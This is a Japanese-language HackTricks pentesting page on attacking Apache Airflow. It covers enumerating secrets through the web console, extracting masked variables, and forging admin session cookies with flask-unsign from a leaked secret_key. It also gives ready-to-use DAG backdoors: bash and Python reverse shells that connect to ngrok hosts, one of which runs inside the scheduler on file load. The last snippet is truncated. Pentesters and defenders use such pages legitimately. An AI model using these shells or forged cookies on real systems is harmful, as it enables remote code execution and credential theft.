# Apache Airflow セキュリティ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 基本情報

[**Apache Airflow**](https://airflow.apache.org)は、**データパイプラインまたはワークフローのオーケストレーションとスケジューリング**のためのプラットフォームとして機能します。データパイプラインの文脈での「オーケストレーション」という用語は、さまざまなソースからの複雑なデータワークフローを整理、調整、管理するプロセスを指します。これらのオーケストレーションされたデータパイプラインの主な目的は、処理され消費可能なデータセットを提供することです。これらのデータセットは、ビジネスインテリジェンスツール、データサイエンスと機械学習モデルなど、ビッグデータアプリケーションの機能に不可欠な多くのアプリケーションに広く利用されています。

基本的に、Apache Airflowを使用すると、何か（イベント、cron）が**発生したときにコードの実行をスケジュールすることができます**。

## ローカルラボ

### Docker-Compose

[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) から**docker-compose設定ファイル**を使用して、完全なapache airflow docker環境を起動できます。（MacOSを使用している場合は、docker VMに少なくとも6GBのRAMを割り当ててください）。

### Minikube

**apache airflowを実行する**簡単な方法の一つは、**minikubeで実行する**ことです：
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow 設定

Airflowは**機密情報**を設定に保存することがあるか、または弱い設定が存在する可能性があります：

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflowを攻撃する前に、**権限の仕組み**を理解する必要があります：

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## 攻撃

### Webコンソール列挙

**Webコンソールへのアクセス**がある場合、以下の情報の一部または全部にアクセスできる可能性があります：

* **変数**（カスタム機密情報がここに保存される可能性があります）
* **接続**（カスタム機密情報がここに保存される可能性があります）
* `http://<airflow>/connection/list/`でアクセス
* [**設定**](./#airflow-configuration)（**`secret_key`** やパスワードなどの機密情報が保存される可能性があります）
* **ユーザー & ロール**のリスト
* **各DAGのコード**（興味深い情報が含まれている可能性があります）

### 変数値の取得

変数はAirflowに保存され、**DAG**がその値に**アクセス**できるようになります。他のプラットフォームのシークレットに似ています。**十分な権限**があれば、`http://<airflow>/variable/list/`のGUIでアクセスできます。\
デフォルトではAirflowはGUIで変数の値を表示しますが、[**これ**](https://marclamberti.com/blog/variables-with-apache-airflow/)によると、**GUI**で**アスタリスク**として表示される**値**の**変数リスト**を設定することが可能です。

![](<../../.gitbook/assets/image (79).png>)

しかし、これらの**値**は**CLI**（DBアクセスが必要）、**任意のDAG**実行、変数エンドポイントにアクセスする**API**（APIをアクティブにする必要があります）、そして**GUI自体**を介しても**取得**できます！\
GUIからこれらの値にアクセスするには、アクセスしたい**変数を選択**し、**Actions -> Exportをクリック**します。\
別の方法は、**検索フィルタリング**を使用して**隠された値**に対して**ブルートフォース**を実行し、それを取得することです：

![](<../../.gitbook/assets/image (30).png>)

### 権限昇格

**`expose_config`** 設定が**True**に設定されている場合、**Userロール**以上のユーザーはWebで**設定を読む**ことができます。この設定には**`secret_key`**が表示されるため、このキーが有効なユーザーは、他のユーザーアカウントになりすますための自分自身の署名付きクッキーを**作成できます**。
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG バックドア (Airflow ワーカー内の RCE)

**DAGが保存されている場所**に**書き込みアクセス権**がある場合、**リバースシェル**を送信する**DAGを作成**することができます。\
このリバースシェルは **airflow worker コンテナ**内で実行されることに注意してください：
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG バックドア (Airflow スケジューラー内の RCE)

コードのルートで**実行されるように設定**すると、この文章を書いている時点で、DAGのフォルダ内に配置してから数秒後に**スケジューラーによって実行されます**。
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG 作成

**DAG クラスタ内のマシンを侵害する**ことに成功した場合、`dags/` フォルダに新しい **DAG スクリプト**を作成することができ、それらは DAG クラスタ内の**残りのマシンにレプリケートされます**。

### DAG コードインジェクション

GUI から DAG を実行するとき、**引数を渡す**ことができます。\
したがって、DAG が適切にコーディングされていない場合、**コマンドインジェクションに対して脆弱**になる可能性があります。\
これはこの CVE で起こったことです: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAG でコマンドインジェクションを**探し始めるために知っておくべきこと**は、**パラメーター**が **`dag_run.conf.get("param_name")`** のコードで**アクセスされる**ということです。

さらに、同じ脆弱性が **変数**にも発生する可能性があります（十分な権限があれば、GUI で**変数の値を制御できる**ことに注意してください）。変数は次のように**アクセスされます**：
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
```markdown
例えばbashコマンド内で使用される場合、コマンドインジェクションを実行することができます。

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
